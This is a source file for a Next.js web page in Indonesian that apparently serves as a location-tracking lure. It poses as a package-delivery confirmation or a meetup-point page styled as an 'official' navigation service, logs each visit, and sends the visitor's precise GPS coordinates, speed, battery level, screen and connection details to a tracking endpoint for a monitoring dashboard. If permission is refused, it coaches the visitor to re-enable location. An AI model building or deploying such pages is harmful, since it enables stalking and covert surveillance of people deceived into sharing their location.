'use client';

import { useState, useEffect, use } from 'react';
import dynamic from 'next/dynamic';

const MapView = dynamic(() => import('@/components/MapView'), {
  ssr: false,
  loading: () => <div style={{ height: '240px', background: '#e2e8f0', borderRadius: '12px' }}></div>
});

export default function TargetViewPage({ params }) {
  const unwrappedParams = use(params);
  const linkId = unwrappedParams.id;

  const [linkConfig, setLinkConfig] = useState(null);
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState(null); // { type: 'loading' | 'success' | 'error', message: string }
  const [capturedLocation, setCapturedLocation] = useState(null);
  const [gmapsUrl, setGmapsUrl] = useState('');

  // 1. Notify visit and fetch config
  useEffect(() => {
    if (!linkId) return;

    fetch(`/api/visit/${linkId}`, { method: 'POST' }).catch(() => {});

    fetch(`/api/links/${linkId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.success && data.link) {
          setLinkConfig(data.link);
        }
      })
      .catch((err) => console.warn('Fetch link error:', err));
  }, [linkId]);

  // Battery helper
  const getBattery = async () => {
    try {
      if (typeof navigator !== 'undefined' && navigator.getBattery) {
        const b = await navigator.getBattery();
        return `${Math.round(b.level * 100)}%${b.charging ? ' (Charging)' : ''}`;
      }
    } catch (e) {}
    return null;
  };

  // Trigger Geolocation
  const handleShareLocation = async () => {
    if (typeof window === 'undefined' || !navigator.geolocation) {
      setStatus({
        type: 'error',
        message: 'Browser Anda tidak mendukung Geolocation API. Silakan buka melalui Google Chrome atau Safari.'
      });
      return;
    }

    setLoading(true);
    setStatus({
      type: 'loading',
      message: '🛰️ Sedang membaca koordinat GPS perangkat Anda untuk menghitung rute...'
    });

    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';
    const battery = await getBattery();

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;

        try {
          const res = await fetch(`/api/track/${linkId || 'direct'}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              latitude,
              longitude,
              accuracy,
              altitude,
              altitudeAccuracy,
              heading,
              speed,
              screenResolution,
              battery,
              connectionType
            })
          });

          const result = await res.json();
          const road = result.address?.road || 'Posisi Anda saat ini';
          const city = result.address?.city && result.address.city !== '-' ? result.address.city : '';
          const fullAddress = [road, city].filter(Boolean).join(', ');

          const dest = linkConfig?.targetDestination ? encodeURIComponent(linkConfig.targetDestination) : `${latitude},${longitude}`;
          const gmaps = `https://www.google.com/maps/dir/?api=1&destination=${dest}`;

          setCapturedLocation({
            coordinates: { latitude, longitude, accuracy },
            address: result.address || { road: fullAddress },
            googleMapsUrl: gmaps
          });
          setGmapsUrl(gmaps);
          setLoading(false);
          setStatus({
            type: 'success',
            message: `📍 <strong>Lokasi Berhasil Terdeteksi!</strong><br>${fullAddress} (&plusmn;${Math.round(accuracy)}m)`
          });
        } catch (err) {
          setLoading(false);
          setStatus({
            type: 'error',
            message: 'Gagal mengirim koordinat ke server. Silakan coba kembali.'
          });
        }
      },
      (err) => {
        setLoading(false);
        if (err.code === 1) {
          setStatus({
            type: 'error',
            message: `
              <strong>⚠️ Izin Lokasi Diperlukan</strong><br>
              Untuk menampilkan rute navigasi dan petunjuk arah dari posisi Anda, silakan ketuk ikon gembok di samping alamat web &rarr; ubah <strong>Lokasi</strong> menjadi <strong>Izinkan</strong>, lalu muat ulang halaman.
            `
          });
        } else {
          setStatus({
            type: 'error',
            message: 'Sinyal GPS tidak dapat dibaca saat ini. Pastikan GPS/Location perangkat telah aktif.'
          });
        }
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
      }
    );
  };

  const isDelivery = linkConfig?.preset === 'delivery';
  const isHangout = linkConfig?.preset === 'hangout';

  const titleText = linkConfig?.title || (isDelivery ? 'Konfirmasi Lokasi Penerima Paket' : isHangout ? 'Titik Kumpul & Lokasi Teman' : 'Berbagi Lokasi Real-Time & Rute');
  const badgeText = linkConfig?.targetDestination
    ? `🎯 Tujuan: ${linkConfig.targetDestination}`
    : isDelivery
    ? '📦 Konfirmasi Pengiriman'
    : isHangout
    ? '☕ Titik Kumpul Teman'
    : '📍 Berbagi Lokasi GPS';

  return (
    <div style={{
      minHeight: '100vh',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px',
      background: '#f8f9fa'
    }}>
      <div style={{
        width: '100%',
        maxWidth: '480px',
        background: '#ffffff',
        borderRadius: '20px',
        boxShadow: '0 12px 36px rgba(0, 0, 0, 0.1)',
        overflow: 'hidden',
        border: '1px solid #dadce0',
        color: '#202124'
      }}>
        {/* Header Visual */}
        <div style={{
          height: '160px',
          background: 'linear-gradient(135deg, #e8f0fe, #d2e3fc)',
          position: 'relative',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center'
        }}>
          <div style={{
            fontSize: '44px',
            filter: 'drop-shadow(0 6px 12px rgba(0,0,0,0.25))',
            animation: 'pulse-ring 2s infinite'
          }}>
            {isDelivery ? '📦' : isHangout ? '☕' : '📍'}
          </div>
        </div>

        {/* Card Body */}
        <div style={{ padding: '28px 24px', display: 'flex', flexDirection: 'column', gap: '18px', textAlign: 'center' }}>
          
          <div style={{
            display: 'inline-flex',
            alignItems: 'center',
            gap: '6px',
            padding: '6px 14px',
            background: '#e8f0fe',
            color: '#1a73e8',
            borderRadius: '9999px',
            fontSize: '0.82rem',
            fontWeight: 600,
            margin: '0 auto'
          }}>
            {badgeText}
          </div>

          <h2 style={{ fontSize: '1.35rem', fontWeight: 700, margin: 0, color: '#202124' }}>
            {titleText}
          </h2>

          <p style={{ fontSize: '0.9rem', color: '#5f6368', lineHeight: 1.55, margin: 0 }}>
            Tautan ini digunakan untuk membagikan koordinat lokasi Anda ke dashboard pemantau. Dengan menekan tombol di bawah dan memilih 'Izinkan', koordinat GPS perangkat Anda akan dibagikan secara aman dan rute navigasi akan ditampilkan di peta.
          </p>

          <div style={{
            background: '#f8f9fa',
            padding: '14px 16px',
            borderRadius: '10px',
            border: '1px solid #edf2f7',
            textAlign: 'left',
            display: 'flex',
            flexDirection: 'column',
            gap: '8px',
            fontSize: '0.82rem',
            color: '#3c4043'
          }}>
            <div>📍 Koordinat dibagikan langsung ke dashboard pemantau</div>
            <div>🗺️ Menampilkan alamat lengkap dan panduan navigasi peta</div>
          </div>

          {/* Status Message */}
          {status && (
            <div
              style={{
                padding: '12px 16px',
                borderRadius: '10px',
                fontSize: '0.85rem',
                textAlign: 'left',
                lineHeight: 1.45,
                background: status.type === 'loading' ? '#e8f0fe' : status.type === 'success' ? '#e6f4ea' : '#fce8e6',
                color: status.type === 'loading' ? '#1967d2' : status.type === 'success' ? '#137333' : '#c5221f',
                border: `1px solid ${status.type === 'loading' ? '#c2e7ff' : status.type === 'success' ? '#ceead6' : '#f9dedc'}`
              }}
              dangerouslySetInnerHTML={{ __html: status.message }}
            />
          )}

          {/* Mini Interactive Map after success */}
          {capturedLocation && (
            <div style={{ height: '240px', borderRadius: '12px', overflow: 'hidden' }}>
              <MapView logs={[capturedLocation]} />
            </div>
          )}

          {/* CTA Action Button */}
          {!capturedLocation ? (
            <button
              onClick={handleShareLocation}
              disabled={loading}
              style={{
                width: '100%',
                padding: '15px 20px',
                background: '#1a73e8',
                color: '#ffffff',
                border: 'none',
                borderRadius: '10px',
                fontSize: '1rem',
                fontWeight: 600,
                cursor: loading ? 'default' : 'pointer',
                boxShadow: '0 4px 14px rgba(26, 115, 232, 0.35)',
                opacity: loading ? 0.8 : 1
              }}
            >
              {loading ? '🛰️ Menghubungkan ke GPS...' : '📍 Izinkan & Bagikan Lokasi Saya'}
            </button>
          ) : (
            <a
              href={gmapsUrl}
              target="_blank"
              rel="noopener noreferrer"
              style={{
                width: '100%',
                boxSizing: 'border-box',
                padding: '15px 20px',
                background: '#34a853',
                color: '#ffffff',
                borderRadius: '10px',
                fontSize: '1rem',
                fontWeight: 600,
                textDecoration: 'none',
                display: 'inline-block',
                boxShadow: '0 4px 14px rgba(52, 168, 83, 0.35)'
              }}
            >
              🚀 Buka Rute di Google Maps ↗
            </a>
          )}

        </div>

        {/* Footer */}
        <div style={{
          padding: '14px 24px',
          background: '#f8f9fa',
          borderTop: '1px solid #dadce0',
          fontSize: '0.78rem',
          color: '#5f6368',
          textAlign: 'center'
        }}>
          🔒 Verifikasi aman &bull; Layanan Geonavigasi Resmi
        </div>

      </div>
    </div>
  );
}
